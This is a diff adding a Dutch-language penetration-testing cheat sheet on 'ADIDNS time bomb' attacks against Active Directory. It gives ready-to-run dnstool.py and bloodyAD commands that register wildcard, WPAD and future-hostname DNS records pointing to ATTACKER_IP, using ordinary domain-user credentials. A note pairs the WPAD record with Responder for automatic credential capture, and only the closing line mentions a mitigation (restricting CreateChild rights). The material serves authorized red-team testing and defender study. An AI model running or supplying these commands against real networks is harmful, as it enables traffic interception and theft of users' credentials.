@@ -1,0 +1,32 @@
+# ADIDNS Time Bomb — DNS records pre-registreren voor toekomstig gebruik
+# Registreer DNS records die naar jouw IP wijzen voor toekomstige aanvallen
+# Handig voor name resolution poisoning en coercion
+#
+# === Vereisten ===
+# - Domain user account (Authenticated Users mogen DNS records aanmaken)
+#
+# === Voorbeelden ===
+
+# Wildcard record toevoegen (vangt alle niet-bestaande namen op)
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r '*.domain.local' -a add -d ATTACKER_IP DC_IP
+
+# Specifiek record toevoegen (bijv. een toekomstige servernaam)
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r 'newserver.domain.local' -a add -d ATTACKER_IP DC_IP
+
+# WPAD record toevoegen (voor proxy poisoning)
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r 'wpad.domain.local' -a add -d ATTACKER_IP DC_IP
+
+# Record querien
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r 'wpad.domain.local' -a query DC_IP
+
+# Record verwijderen (opruimen)
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r 'wpad.domain.local' -a remove DC_IP
+
+# Via bloodyAD
+python3 bloodyAD.py -u USER -p 'PASS' -d DOMAIN --host DC_IP add dnsRecord wpad ATTACKER_IP
+
+# Noot: ADIDNS records staan in CN=MicrosoftDNS,DC=DomainDnsZones
+# Noot: Standaard mogen Authenticated Users records aanmaken
+# Noot: Wildcard records vangen ALLE niet-bestaande DNS queries op
+# Noot: WPAD record + Responder = automatische credential capture
+# Noot: Mitigatie: Beperk CreateChild rechten op MicrosoftDNS container
